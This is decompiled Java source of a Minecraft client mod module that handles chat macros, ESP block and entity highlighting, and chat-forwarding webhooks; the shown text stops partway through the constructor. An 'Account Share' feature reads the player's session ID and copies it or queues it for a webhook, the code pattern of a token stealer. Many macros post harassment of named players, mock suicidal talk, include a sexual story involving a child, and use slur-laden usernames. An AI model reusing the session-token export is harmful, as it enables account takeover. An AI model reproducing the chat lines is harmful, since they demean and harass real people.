/*     */ package com.example.module.impl;
/*     */ 
/*     */ import com.ricedotwho.rsm.component.impl.Renderer3D;
/*     */ import com.ricedotwho.rsm.data.Colour;
/*     */ import com.ricedotwho.rsm.event.api.SubscribeEvent;
/*     */ import com.ricedotwho.rsm.event.impl.game.ChatEvent;
/*     */ import com.ricedotwho.rsm.event.impl.game.ClientTickEvent;
/*     */ import com.ricedotwho.rsm.event.impl.game.ConnectionEvent;
/*     */ import com.ricedotwho.rsm.event.impl.player.PlayerChatEvent;
/*     */ import com.ricedotwho.rsm.event.impl.render.Render2DEvent;
/*     */ import com.ricedotwho.rsm.event.impl.render.Render3DEvent;
/*     */ import com.ricedotwho.rsm.module.Module;
/*     */ import com.ricedotwho.rsm.module.api.Category;
/*     */ import com.ricedotwho.rsm.module.api.ModuleInfo;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.Setting;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.group.DefaultGroupSetting;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.impl.BooleanSetting;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.impl.ButtonSetting;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.impl.DragSetting;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.impl.MultiBoolSetting;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.impl.NumberSetting;
/*     */ import com.ricedotwho.rsm.ui.clickgui.settings.impl.StringSetting;
/*     */ import com.ricedotwho.rsm.utils.ChatUtils;
/*     */ import com.ricedotwho.rsm.utils.render.render2d.NVGUtils;
/*     */ import java.net.URI;
/*     */ import java.net.http.HttpClient;
/*     */ import java.net.http.HttpRequest;
/*     */ import java.net.http.HttpResponse;
/*     */ import java.lang.reflect.Constructor;
/*     */ import java.lang.reflect.Field;
/*     */ import java.lang.reflect.Method;
/*     */ import java.util.ArrayList;
/*     */ import java.util.Collections;
/*     */ import java.util.HashSet;
/*     */ import java.util.IdentityHashMap;
/*     */ import java.util.LinkedHashMap;
/*     */ import java.util.List;
/*     */ import java.util.Locale;
/*     */ import java.util.Set;
/*     */ import java.util.concurrent.CompletableFuture;
/*     */ import java.util.concurrent.TimeUnit;
/*     */ import java.util.regex.Matcher;
/*     */ import java.util.regex.Pattern;
/*     */ import net.minecraft.class_124;
/*     */ import net.minecraft.class_1661;
/*     */ import net.minecraft.class_1937;
/*     */ import net.minecraft.class_1799;
/*     */ import net.minecraft.class_2338;
/*     */ import net.minecraft.class_238;
/*     */ import net.minecraft.class_243;
/*     */ import net.minecraft.class_2561;
/*     */ import net.minecraft.class_2680;
/*     */ import net.minecraft.class_310;
/*     */ import net.minecraft.class_355;
/*     */ import net.minecraft.class_634;
/*     */ import net.minecraft.class_640;
/*     */ import net.minecraft.class_5250;
/*     */ import org.joml.Vector2d;
/*     */ 
/*     */ 
/*     */ 
/*     */ @ModuleInfo(aliases = {"ericbakeraddons"}, id = "ericbakeraddons", category = Category.OTHER)
/*     */ public class ChatCommands
/*     */   extends Module
/*     */ {
/*     */   public static final String SSID_CONFIRM_TOKEN = "__ssid_confirm_internal__";
/*     */   private static ChatCommands instance;
/*  52 */   private static final List<String> WEBHOOK_IGNORE = List.of("You already tipped everyone that has boosters active, so there isn't anybody to be tipped right now!", "You are sending commands too fast! Please slow down.", "No one has a network booster active right now! Try again later.");
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*  57 */   private static final HttpClient HTTP_CLIENT = HttpClient.newBuilder().build();
/*  58 */   private static final HttpClient REDIRECT_CLIENT = HttpClient.newBuilder()
/*  59 */     .followRedirects(HttpClient.Redirect.ALWAYS)
/*  60 */     .build();
/*  61 */   private static final Colour TITANIUM_FILL_COLOUR = new Colour(80, 180, 255, 55);
/*  62 */   private static final Colour TITANIUM_OUTLINE_COLOUR = new Colour(110, 210, 255, 180);
/*  63 */   private static final Colour NODE_FILL_COLOUR = new Colour(192, 90, 255, 55);
/*  64 */   private static final Colour NODE_OUTLINE_COLOUR = new Colour(210, 130, 255, 190);
/*  65 */   private static final Colour CUSTOM_FILL_COLOUR = new Colour(255, 120, 50, 120);
/*  66 */   private static final Colour CUSTOM_OUTLINE_COLOUR = new Colour(255, 195, 90, 255);
/*  67 */   private static final double CUSTOM_BOX_PADDING = 0.08D;
/*  68 */   private static final double CUSTOM_BOX_SMOOTHING = 0.45D;
/*  69 */   private static final int ESP_SCAN_INTERVAL_TICKS = 10;
/*  70 */   private static final int ESP_SCAN_IDLE_INTERVAL_TICKS = 40;
/*  71 */   private static final byte MATCH_NONE = 0;
/*  72 */   private static final byte MATCH_TITANIUM = 1;
/*  73 */   private static final byte MATCH_NODE = 2;
/*  74 */   private static final Pattern HEALTH_FRACTION_PATTERN = Pattern.compile("(?<!\\d)(\\d+)\\s*/\\s*(\\d+)(?!\\d)");
/*  75 */   private static final Pattern COMMISSION_PERCENT_PATTERN = Pattern.compile("(?<!\\d)(\\d+(?:\\.\\d+)?)\\s*%");
/*  76 */   private static final int COMMISSION_SCAN_INTERVAL_TICKS = 1;
/*  77 */   private static final Colour COMMISSION_PANEL_FILL = new Colour(22, 18, 34, 185);
/*  78 */   private static final Colour COMMISSION_PANEL_OUTLINE = new Colour(138, 104, 222, 235);
/*  79 */   private static final Colour COMMISSION_TITLE_COLOUR = new Colour(222, 228, 255, 255);
/*  80 */   private static final Colour COMMISSION_TEXT_DEFAULT = new Colour(245, 245, 255, 255);
/*  81 */   private static final Colour COMMISSION_TEXT_PROGRESS = new Colour(255, 247, 120, 255);
/*  82 */   private static final Colour COMMISSION_TEXT_DONE = new Colour(95, 217, 140, 255);
/*  83 */   private static final Colour COMMISSION_TEXT_ZERO = new Colour(255, 96, 124, 255);
/*  83 */   private static final Colour COMMISSION_PROGRESS_TRACK = new Colour(255, 255, 255, 36);
/*  83 */   private static final Colour COMMISSION_PROGRESS_START = new Colour(201, 92, 143, 255);
/*  83 */   private static final Colour COMMISSION_PROGRESS_END = new Colour(154, 122, 222, 255);
/*  84 */   private static final Colour RSA_R_COLOUR = new Colour(178, 99, 223, 255);
/*  85 */   private static final Colour RSA_S_COLOUR = new Colour(197, 123, 234, 255);
/*  86 */   private static final Colour RSA_A_COLOUR = new Colour(215, 147, 244, 255);
/*     */   private record ScheduledLine(long delayMs, String command) {}
/*     */   private record CommissionOverlayMetrics(float boxWidth, float boxHeight, float padding, float titleSize, float lineSize, float rsaSize, float lineGap, float barTopGap, float barHeight, float barRadius, float titleY, float bodyStartY, float rsaY, float radius, float outlineThickness) {}
/*     */   
/*  65 */   private final class_310 mc = class_310.method_1551(); public class_310 getMc() { return this.mc; }
/*  66 */    private final LinkedHashMap<String, Integer> commandCategories = new LinkedHashMap<>(); public LinkedHashMap<String, Integer> getCommandCategories() { return this.commandCategories; }
/*  67 */    private final LinkedHashMap<String, List<ScheduledLine>> commandResponses = new LinkedHashMap<>(); public LinkedHashMap<String, List<ScheduledLine>> getCommandResponses() { return this.commandResponses; }
/*     */   
/*  69 */   private final List<String> category1Commands = new ArrayList<>(); public List<String> getCategory1Commands() { return this.category1Commands; }
/*  70 */    private final List<String> category2Commands = new ArrayList<>(); public List<String> getCategory2Commands() { return this.category2Commands; }
/*  71 */    private final List<String> category3Commands = new ArrayList<>(); public List<String> getCategory3Commands() { return this.category3Commands; }
/*  72 */    private final List<String> otherCommands = new ArrayList<>(); public List<String> getOtherCommands() { return this.otherCommands; }
/*     */   
/*  74 */   private final BooleanSetting enableChatCommands = new BooleanSetting("Enable Chat Commands", true); public BooleanSetting getEnableChatCommands() { return this.enableChatCommands; }
/*  75 */    private final DefaultGroupSetting chatCommandSettingsGroup = new DefaultGroupSetting("Chat Commands", this); public DefaultGroupSetting getChatCommandSettingsGroup() { return this.chatCommandSettingsGroup; }
/*  76 */    private final BooleanSetting partyChatCommandsEnabled = new BooleanSetting("Party chat", true); public BooleanSetting getPartyChatCommandsEnabled() { return this.partyChatCommandsEnabled; }
/*  77 */    private final BooleanSetting guildChatCommandsEnabled = new BooleanSetting("Guild chat", false); public BooleanSetting getGuildChatCommandsEnabled() { return this.guildChatCommandsEnabled; }
/*  78 */    private final DefaultGroupSetting levelPrefixGroup = new DefaultGroupSetting("Level prefix", this); public DefaultGroupSetting getLevelPrefixGroup() { return this.levelPrefixGroup; }
/*  79 */    private final BooleanSetting levelPrefixEnable = new BooleanSetting("Enable", true); public BooleanSetting getLevelPrefixEnable() { return this.levelPrefixEnable; }
/*  80 */    private final BooleanSetting red480Plus = new BooleanSetting("Red 480+", true); public BooleanSetting getRed480Plus() { return this.red480Plus; }
/*  81 */    private final BooleanSetting goldBrackets = new BooleanSetting("Gold brackets", true); public BooleanSetting getGoldBrackets() { return this.goldBrackets; }
/*  82 */    private final BooleanSetting diamondBrackets = new BooleanSetting("Diamond brackets", true); public BooleanSetting getDiamondBrackets() { return this.diamondBrackets; }
/*  83 */    private final DefaultGroupSetting webhookGroup = new DefaultGroupSetting("Webhook", this); public DefaultGroupSetting getWebhookGroup() { return this.webhookGroup; }
/*  84 */    private final DefaultGroupSetting accountShareGroup = new DefaultGroupSetting("Account Share", this); public DefaultGroupSetting getAccountShareGroup() { return this.accountShareGroup; }
/*  85 */    private final DefaultGroupSetting miscGroup = new DefaultGroupSetting("Misc", this); public DefaultGroupSetting getMiscGroup() { return this.miscGroup; }
/*  86 */    private final DefaultGroupSetting espGroup = new DefaultGroupSetting("ESP", this); public DefaultGroupSetting getEspGroup() { return this.espGroup; }
/*  86 */    private final DefaultGroupSetting customHighlightGroup = new DefaultGroupSetting("Custom Highlight", this); public DefaultGroupSetting getCustomHighlightGroup() { return this.customHighlightGroup; }
/*  86 */    private final DefaultGroupSetting commissionOverlayGroup = new DefaultGroupSetting("Commission Overlay", this); public DefaultGroupSetting getCommissionOverlayGroup() { return this.commissionOverlayGroup; }
/*  86 */    private final BooleanSetting miscEnabled = new BooleanSetting("Enable", true); public BooleanSetting getMiscEnabled() { return this.miscEnabled; }
/*  87 */    private final BooleanSetting espEnabled = new BooleanSetting("Enable", true); public BooleanSetting getEspEnabled() { return this.espEnabled; }
/*  88 */    private final BooleanSetting titaniumHighlightEnabled = new BooleanSetting("Titanium", true); public BooleanSetting getTitaniumHighlightEnabled() { return this.titaniumHighlightEnabled; }
/*  89 */    private final BooleanSetting nodeHighlightEnabled = new BooleanSetting("End Nodes", true); public BooleanSetting getNodeHighlightEnabled() { return this.nodeHighlightEnabled; }
/*  90 */    private final BooleanSetting tracerEnabled = new BooleanSetting("Tracer", true); public BooleanSetting getTracerEnabled() { return this.tracerEnabled; }
/*  91 */    private final BooleanSetting tracerClosestOnly = new BooleanSetting("Closest only", false, () -> ((Boolean)this.tracerEnabled.getValue()).booleanValue()); public BooleanSetting getTracerClosestOnly() { return this.tracerClosestOnly; }
/*  92 */    private final NumberSetting tracerThicknessPx = new NumberSetting("Tracer Thickness", 1.0D, 100.0D, 30.0D, 1.0D, "px", () -> ((Boolean)this.tracerEnabled.getValue()).booleanValue()); public NumberSetting getTracerThicknessPx() { return this.tracerThicknessPx; }
/*  93 */    private final BooleanSetting customHighlightEnabled = new BooleanSetting("Enable", true); public BooleanSetting getCustomHighlightEnabled() { return this.customHighlightEnabled; }
/*  94 */    private final StringSetting customHighlightNames = new StringSetting("Names", ""); public StringSetting getCustomHighlightNames() { return this.customHighlightNames; }
/*  95 */    private final BooleanSetting customIgnoreZeroHealth = new BooleanSetting("Ignore 0 Health", true, () -> ((Boolean)this.customHighlightEnabled.getValue()).booleanValue()); public BooleanSetting getCustomIgnoreZeroHealth() { return this.customIgnoreZeroHealth; }
/*  95 */    private final BooleanSetting customTracerEnabled = new BooleanSetting("Tracer", false, () -> ((Boolean)this.customHighlightEnabled.getValue()).booleanValue()); public BooleanSetting getCustomTracerEnabled() { return this.customTracerEnabled; }
/*  96 */    private final BooleanSetting customTracerClosestOnly = new BooleanSetting("Closest only", false, () -> (((Boolean)this.customHighlightEnabled.getValue()).booleanValue() && ((Boolean)this.customTracerEnabled.getValue()).booleanValue())); public BooleanSetting getCustomTracerClosestOnly() { return this.customTracerClosestOnly; }
/*  97 */    private final NumberSetting customTracerThicknessPx = new NumberSetting("Tracer Thickness", 1.0D, 100.0D, 30.0D, 1.0D, "px", () -> (((Boolean)this.customHighlightEnabled.getValue()).booleanValue() && ((Boolean)this.customTracerEnabled.getValue()).booleanValue())); public NumberSetting getCustomTracerThicknessPx() { return this.customTracerThicknessPx; }
/*  98 */    private final BooleanSetting commissionOverlayEnabled = new BooleanSetting("Enable", true); public BooleanSetting getCommissionOverlayEnabled() { return this.commissionOverlayEnabled; }
/*  99 */    private final DragSetting commissionOverlayPosition = new DragSetting("Commission Overlay", new Vector2d(8.0D, 8.0D), new Vector2d(180.0D, 80.0D), () -> ((Boolean)this.commissionOverlayEnabled.getValue()).booleanValue()); public DragSetting getCommissionOverlayPosition() { return this.commissionOverlayPosition; }
/* 100 */    private final BooleanSetting commissionPeekEnabled = new BooleanSetting("Peek", false, () -> ((Boolean)this.commissionOverlayEnabled.getValue()).booleanValue()); public BooleanSetting getCommissionPeekEnabled() { return this.commissionPeekEnabled; }
/* 101 */    private final Setting<?> commissionPeekKeybindSetting = createCommissionPeekKeybindSetting(); public Setting<?> getCommissionPeekKeybindSetting() { return this.commissionPeekKeybindSetting; }
/* 102 */    private final BooleanSetting commissionOnlyRoyalPigeonInventory = new BooleanSetting("Only display if Royal Pigeon is in inventory", false, () -> ((Boolean)this.commissionOverlayEnabled.getValue()).booleanValue()); public BooleanSetting getCommissionOnlyRoyalPigeonInventory() { return this.commissionOnlyRoyalPigeonInventory; }
/* 103 */    private final BooleanSetting commissionOnlyRoyalPigeonHotbar = new BooleanSetting("Only display if Royal Pigeon is in hotbar", false, () -> ((Boolean)this.commissionOverlayEnabled.getValue()).booleanValue()); public BooleanSetting getCommissionOnlyRoyalPigeonHotbar() { return this.commissionOnlyRoyalPigeonHotbar; }
/*  95 */    private final ButtonSetting debugNametagScanButton = new ButtonSetting("Debug Nametags", "", this::debugCustomHighlightScan); public ButtonSetting getDebugNametagScanButton() { return this.debugNametagScanButton; }
/*  87 */   private final Setting<?> ptwKeybind = createPtwKeybindSetting(); public Setting<?> getPtwKeybind() { return this.ptwKeybind; }
/*     */ 
/*     */ 
/*     */   
/*  91 */   private final BooleanSetting glorpWarp = new BooleanSetting("glorp warp", false); public BooleanSetting getGlorpWarp() { return this.glorpWarp; }
/*  91 */   private Object commissionPeekKeybind;
/*  91 */   private final List<String> commissionOverlayLines = new ArrayList<>();
/*  91 */   private boolean commissionHeaderDetected;
/*  91 */   private int commissionOverlayTickCounter;
/*  92 */    private final BooleanSetting webhookEnabled = new BooleanSetting("Enabled", false); public BooleanSetting getWebhookEnabled() { return this.webhookEnabled; }
/*  96 */    private final StringSetting webhookLink = new StringSetting("Webhook Link", ""); public StringSetting getWebhookLink() { return this.webhookLink; }
/*  97 */    private final BooleanSetting guildChatWebhookEnabled = new BooleanSetting("Enable Guild chat", false); public BooleanSetting getGuildChatWebhookEnabled() { return this.guildChatWebhookEnabled; }
/*  98 */    private final StringSetting guildChatWebhook = new StringSetting("Guild chat", ""); public StringSetting getGuildChatWebhook() { return this.guildChatWebhook; }
/*  99 */    private final BooleanSetting partyChatWebhookEnabled = new BooleanSetting("Enable Party chat", false); public BooleanSetting getPartyChatWebhookEnabled() { return this.partyChatWebhookEnabled; }
/* 100 */    private final StringSetting partyChatWebhook = new StringSetting("Party chat", ""); public StringSetting getPartyChatWebhook() { return this.partyChatWebhook; }
/* 101 */    private final BooleanSetting privateMessagesWebhookEnabled = new BooleanSetting("Enable Private Messages", false); public BooleanSetting getPrivateMessagesWebhookEnabled() { return this.privateMessagesWebhookEnabled; }
/* 102 */    private final StringSetting privateMessagesWebhook = new StringSetting("Private Messages", ""); public StringSetting getPrivateMessagesWebhook() { return this.privateMessagesWebhook; }
/* 103 */    private final BooleanSetting loginNotifierWebhookEnabled = new BooleanSetting("Enable Log in notifier", false); public BooleanSetting getLoginNotifierWebhookEnabled() { return this.loginNotifierWebhookEnabled; }
/* 104 */    private final StringSetting loginNotifierWebhook = new StringSetting("Log in notifier", ""); public StringSetting getLoginNotifierWebhook() { return this.loginNotifierWebhook; }
/* 105 */    private final BooleanSetting accountShareEnabled = new BooleanSetting("Enable", false); public BooleanSetting getAccountShareEnabled() { return this.accountShareEnabled; }
/* 106 */    private final StringSetting ssidWebhook = new StringSetting("SSID webhook", ""); private final ButtonSetting copyMinecraftSsidButton; private final ButtonSetting sendMinecraftSsidButton; private String cachedWebhookInput; private String cachedWebhookResolved; private String lastKnownServerAddress; private String lastLoginNotifierEvent; private boolean pendingSsidSend; private String pendingSsidPayload; private MultiBoolSetting chatCommands1; private MultiBoolSetting chatCommands2; private MultiBoolSetting chatCommands3; private MultiBoolSetting otherCommandsSetting; private final ButtonSetting enableAllButton; private final ButtonSetting disableAllButton; private final List<class_2338> titaniumBlocks = new ArrayList<>(); private final List<class_2338> nodeBlocks = new ArrayList<>(); private final List<class_238> customEntityBoxes = new ArrayList<>(); private final List<net.minecraft.class_1297> customMatchedEntities = new ArrayList<>(); private final IdentityHashMap<net.minecraft.class_1297, class_238> customSmoothedBoxes = new IdentityHashMap<>(); private final List<Object> titaniumRenderTasks = new ArrayList<>(); private final List<Object> nodeRenderTasks = new ArrayList<>(); private final List<Object> customEntityRenderTasks = new ArrayList<>(); private final IdentityHashMap<Object, Byte> blockHighlightTypeCache = new IdentityHashMap<>(); private int titaniumTickCounter; private int customHighlightTickCounter; private int lastEspScanX = Integer.MIN_VALUE; private int lastEspScanY = Integer.MIN_VALUE; private int lastEspScanZ = Integer.MIN_VALUE; private boolean espScanInitialized; private String cachedCustomNamesRaw = ""; private Set<String> cachedCustomNames = Set.of(); private Constructor<?> filledBoxConstructor; private Constructor<?> outlineBoxConstructor; private Constructor<?> lineConstructor; private Method addRenderTaskMethod; private boolean titaniumRenderBridgeReady; private Method entityBoundingBoxMethod; private Method worldEntitiesMethod; public StringSetting getSsidWebhook() { return this.ssidWebhook; }
/* 107 */   public ChatCommands() { this.copyMinecraftSsidButton = new ButtonSetting("Copy Minecraft SSID", "", () -> {
/*     */           if (!((Boolean)this.accountShareEnabled.getValue()).booleanValue()) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Account Share is disabled.", new Object[0]);
/*     */             return;
/*     */           } 
/*     */           if (this.mc.method_1548() == null) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to copy SSID: user not available.", new Object[0]);
/*     */             return;
/*     */           } 
/*     */           String ssid = this.mc.method_1548().method_1675();
/*     */           if (ssid == null || ssid.isBlank()) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to copy SSID: session id is empty.", new Object[0]);
/*     */             return;
/*     */           } 
/*     */           this.mc.field_1774.method_1455(ssid);
/*     */           ChatUtils.chat(String.valueOf(class_124.field_1060) + "Copied Minecraft SSID to clipboard.", new Object[0]);
/*     */         });
/* 124 */     this.sendMinecraftSsidButton = new ButtonSetting("Send SSID to webhook", "", () -> {
/*     */           if (!((Boolean)this.accountShareEnabled.getValue()).booleanValue()) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Account Share is disabled.", new Object[0]);
/*     */             
/*     */             return;
/*     */           } 
/*     */           
/*     */           if (this.mc.method_1548() == null) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to send SSID: user not available.", new Object[0]);
/*     */             
/*     */             return;
/*     */           } 
/*     */           String username = this.mc.method_1548().method_1676();
/*     */           if (username == null || username.isBlank()) {
/*     */             username = "unknown";
/*     */           }
/*     */           String ssid = this.mc.method_1548().method_1675();
/*     */           if (ssid == null || ssid.isBlank()) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to send SSID: session id is empty.", new Object[0]);
/*     */             return;
/*     */           } 
/*     */           if (this.ssidWebhook.getValue() == null || ((String)this.ssidWebhook.getValue()).trim().isEmpty()) {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1061) + "Unable to send SSID: invalid or empty webhook.", new Object[0]);
/*     */             return;
/*     */           } 
/*     */           this.pendingSsidPayload = "Username: " + username + " | SSID: " + ssid;
/*     */           this.pendingSsidSend = true;
/*     */           class_5250 class_5250 = class_2561.method_43470("Type __ssid_confirm_internal__ in chat to confirm sending SSID to webhook.");
/*     */           if (this.mc.field_1724 != null) {
/*     */             this.mc.field_1724.method_7353((class_2561)class_5250, false);
/*     */           } else {
/*     */             ChatUtils.chat(String.valueOf(class_124.field_1054) + "Click the confirm message in chat to send SSID.", new Object[0]);
/*     */           } 
/*     */         });
/* 158 */     this.cachedWebhookInput = "";
/* 159 */     this.cachedWebhookResolved = "";
/* 160 */     this.lastKnownServerAddress = "unknown";
/* 161 */     this.lastLoginNotifierEvent = "";
/* 162 */     this.pendingSsidSend = false;
/* 163 */     this.pendingSsidPayload = "";
/* 164 */     this.titaniumTickCounter = 0;
/* 165 */     this.titaniumRenderBridgeReady = initTitaniumRenderBridge();
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 170 */     this.enableAllButton = new ButtonSetting("Enable All", "", () -> {
/*     */           setCategoryEnabled(this.chatCommands1, this.category1Commands, true);
/*     */           
/*     */           setCategoryEnabled(this.chatCommands2, this.category2Commands, true);
/*     */           setCategoryEnabled(this.chatCommands3, this.category3Commands, true);
/*     */           setCategoryEnabled(this.otherCommandsSetting, this.otherCommands, true);
/*     */           ChatUtils.chat(String.valueOf(class_124.field_1060) + "All chat commands enabled", new Object[0]);
/*     */         });
/* 178 */     this.disableAllButton = new ButtonSetting("Disable All", "", () -> {
/*     */           setCategoryEnabled(this.chatCommands1, this.category1Commands, false);
/*     */           
/*     */           setCategoryEnabled(this.chatCommands2, this.category2Commands, false);
/*     */           
/*     */           setCategoryEnabled(this.chatCommands3, this.category3Commands, false);
/*     */           setCategoryEnabled(this.otherCommandsSetting, this.otherCommands, false);
/*     */           ChatUtils.chat(String.valueOf(class_124.field_1061) + "All chat commands disabled", new Object[0]);
/*     */         });
/* 187 */     instance = this;
/* 188 */     registerCommand(1, "!admin", new String[] { "pc admin is fat" });
/* 189 */     registerCommand(1, "!hello", new String[] { "pc Hello!" });
/* 190 */     registerCommand(1, "!test", new String[] { "pc test" });
/*     */     
/* 192 */     registerCommand(2, "!gentref", new String[] { "pc Gentlemen Reference", "pc they call him 007", "pc 0 times ee2 done", "pc 0 dps", "pc 7/7 right lever" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 199 */     registerCommand(2, "!gentbookref", new String[] { "pc So what happened was i went to the mall with somebody", "pc we went to this bookstore (alr its store for books)", "pc we went to manga section we were lookin at wrong", "pc i grabbed the book, like skin through the pages", "pc and then i see 1 page the page was just literly pantys", "pc so my smart (in that mumble) as decided to sniff here, i went", "pc SNIFF", "pc like i was snoring c*ke", "pc then i turn the page, and who do i see?", "pc a little girl holding the pantys", "pc so i ran out", "pc -gentlemen1210" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 213 */     registerCommand(1, "!real", new String[] { "pc so real" });
/* 214 */     registerCommand(1, "!crash", new String[] { "pc you are fat" });
/* 215 */     registerCommand(1, "!limbo", new String[] { "pc you are gent" });
/* 216 */     registerCommand(1, "!meta", new String[] { "pc so meta" });
/*     */     
/* 218 */     registerCommandWithDelays(1, "!math", new long[] { 200L, 200L, 1200L }, new String[] { "pc 6 * 2 = 2", "pc 1% of 100 is 10", "pc -gentlemen1210" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 226 */     registerCommand(2, "!redstoneref", new String[] { "pc use wither cloak it works every time", "pc badlion is the superior 1.8.9 its not my pc", "pc 1.21 is the future of skyblock", "pc surely i profit from this update", "pc hey stop twisting my words", "pc You have 37 pending Bestiary Milestones to be claimed!" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 234 */     registerCommand(2, "!adminref", new String[] { "pc thefat987", "pc stop eating", "pc there is not enough spot for TheAdmin987! pls check for weight cap" });
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 239 */     registerCommand(2, "!ericref", new String[] { "pc Party > [MVP+] FurryPawsUwU: he really wanted runs?", "pc Party > [MVP+] FurryPawsUwU: weird" });
/*     */ 
/*     */ 
/*     */     
/* 243 */     registerCommand(2, "!penguinref", new String[] { "pc how could penguin have ref?????", "pc bros peak meta player" });
/*     */ 
/*     */ 
/*     */     
/* 247 */     registerCommand(2, "!maddyref", new String[] { "pc meow meow meow", "pc im a good mage if you want 1 run per month", "pc fine i wont dps" });
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 252 */     registerCommand(2, "!meow", new String[] { "pc meow", "pc mraow", "pc mrrp nyah", "pc mrrow", "pc :3" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 259 */     registerCommand(1, "!ref", new String[] { "pc gent ref" });
/*     */     
/* 261 */     registerCommand(1, "!bakerhelp", new String[] { "pc !bakerclient, !bakerhelp, !gentref, !gentbookref, !real, !crash, !limbo, !meta, !adminref, !redstoneref, !penguinref, !maddyref, !meow, !ref", "pc !clip, !diana, !oliref, !math, !hazelref, !devref, !roseref, !ericref, !hamiltonref, !leonref, !martinasref, !jqnxcref", "pc !67, !thearef, !stenoref, !hozoniref, !melonref, 67, !dt, 1s, !harryref, !dexref, !eggcurdref, !joshieref" });
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 266 */     registerCommand(2, "!eggcurdref", new String[] { "pc im gooning to your mining bro", "pc eric you suck at everything and i hate you for existing", "pc ill host the server after i get level 524", "pc hamilton is my will to live", "pc 90 chimera 8 dyes 60 wools 40 phoenix 650 fragments 1.5b/hr" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 273 */     registerCommand(2, "!hamiltonref", new String[] { "pc john jay got sick after writing 5", "pc james madison wrote 29", "pc HAMILTON WROTE", "pc THE OTHER 51" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 279 */     registerCommand(2, "!joshieref", new String[] { "pc erics a femboy i just cant prove it" });
/*     */     
/* 281 */     registerCommand(1, "!bakerclient", new String[] { "pc Add ericbakerchef on Discord", "pc Note that this mod isn't very polished and not really mean't for anyone else to use." });
/*     */ 
/*     */ 
/*     */     
/* 285 */     registerCommand(1, "!clip", new String[] { "pc Failed to load clip: Weight limit exceeded by 500%!" });
/* 286 */     registerCommand(1, "!diana", new String[] { "p inq menacingcondom38 shegaveconsent indianstreetfood n_word" });
/*     */     
/* 288 */     registerCommand(2, "!oliref", new String[] { "pc 08Master Reference", "pc They call him 007", "pc 0 bank", "pc 0 chims", "pc 7k spent on gems" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 295 */     registerCommand(3, "!roseref", new String[] { "pc Im a DEMON", "pc IM SO SAD", "pc EVERYONE HATES ME", "pc STOP TALKING TO ME IM SO SAD", "pc IM SO DEPRESSED AND WANT TO DIE" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 302 */     registerCommand(3, "!hazelref", new String[] { "pc PLEASE IM BEGGING YOU", "pc PLEASE SAVE ME", "pc AYMA PLEASE ANYTHING YOU WANT PLEASE", "pc GET HIM OUT OF MY LIFE PLEASE", "pc @ARROW ik its bad to beg you to ban someone i dont like but please" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 309 */     registerCommand(3, "!devref", new String[] { "pc I am NOT an egg!" });
/* 310 */     registerCommand(3, "!leonref", new String[] { "pc whos my little discord kitten" });
/* 311 */     registerCommand(3, "!martref", new String[] { "pc IT'S S PLUS OMG IT'S S PLUS GUYS IT'S ACTUALLY S PLUS" });
/*     */     
/* 313 */     registerCommand(3, "!jqnxcref", new String[] { "pc why are you calling my friend a pdf without proof?", "pc no i dont wanna read the proof", "pc can we kick this guy?", "pc asking for proof != defending btw" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 319 */     registerCommand(3, "!dexref", new String[] { "pc my cute little ekitten", "pc maxdragonis i4 ee2 core", "pc isnt 49s storm wr", "pc diivaks is no longer ready!", "pc diivaks was killed by Withermancer and became a ghost. (4)" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 326 */     registerCommandWithDelays(3, "!67", new long[] { 200L, 600L, 1000L, 1400L }, new String[] { "pc 6767676767676767676767676767676767", "pc 6767676767676767676767676767676767", "pc 6767676767676767676767676767676767", "pc 6767676767676767676767676767676767" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 335 */     registerCommand(3, "!cataholicref", new String[] { "pc best player", "pc no debate", "pc impossible for him to have a ref", "pc 67" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 341 */     registerCommand(3, "!thearef", new String[] { "pc look tic tac toe is hard", "pc you cant blame me", "pc sorry i ratted you it was an accident i swear", "pc my pb is 4 days withou a ban" });
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 347 */     registerCommand(3, "!stenoref", new String[] { "pc spring boots?", "pc i thought jerry gun was still meta for crystals", "pc is 35s maxor bad?" });
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 352 */     registerCommand(3, "!hozoniref", new String[] { "pc how can hozoni have a ref", "pc he's too nonchalant for that shit" });
/*     */ 
/*     */ 
